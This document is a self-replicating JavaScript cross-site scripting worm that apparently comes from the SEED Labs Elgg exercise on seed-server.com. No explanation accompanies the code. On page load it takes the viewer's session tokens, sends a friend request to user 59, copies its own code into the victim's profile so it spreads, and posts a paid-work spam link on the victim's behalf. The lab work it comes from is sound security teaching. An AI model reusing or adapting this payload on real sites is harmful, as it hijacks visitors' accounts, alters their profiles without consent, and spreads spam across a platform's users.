<script id="worm" type="text/javascript">

    window.onload = function() {

        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        // I) sending friend request to samy
        var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token + token;

        if(elgg.session.user.guid != 59) {
            var Ajax = new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send();
        }

        // II) replicating the worm

        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        // modifying the victim's profile
        sendurl = "http://www.seed-server.com/action/profile/edit";

        var content = token + ts +"&name=" + elgg.session.user.name;
        content += "&description=" + wormCode;
        content += "&accesslevel[description]=1";
        content += "&briefdescription=";
        content += "&accesslevel[briefdescription]=2";
        content += "&location=";
        content += "&accesslevel[location]=2";
        content += "&interests=";
        content += "&accesslevel[interests]=2";
        content += "&skills=";
        content += "&accesslevel[skills]=2";
        content += "&contactemail=";
        content += "&accesslevel[contactemail]=2";
        content += "&phone=";
        content += "&accesslevel[phone]=2";
        content += "&mobile=";
        content += "&accesslevel[mobile]=2";
        content += "&website=";
        content += "&accesslevel[website]=2";
        content += "&twitter=";
        content += "&accesslevel[twitter]=2";
        content += "&guid=" + elgg.session.user.guid;

        // Create and send the Ajax request to modify victim's profile
        if(elgg.session.user.guid != 59) {
            var Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }

        // III) posting victim's profile link on the wire

        sendurl = "http://www.seed-server.com/action/thewire/add";

        post = "To earn 12 USD/hour, visit now\nhttp://www.seed-server.com/profile/" + elgg.session.user.name;
        post += (token + ts + "&body=" + post);

        if(elgg.session.user.guid != 59) {
            var Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(post);
        }
    }

</script>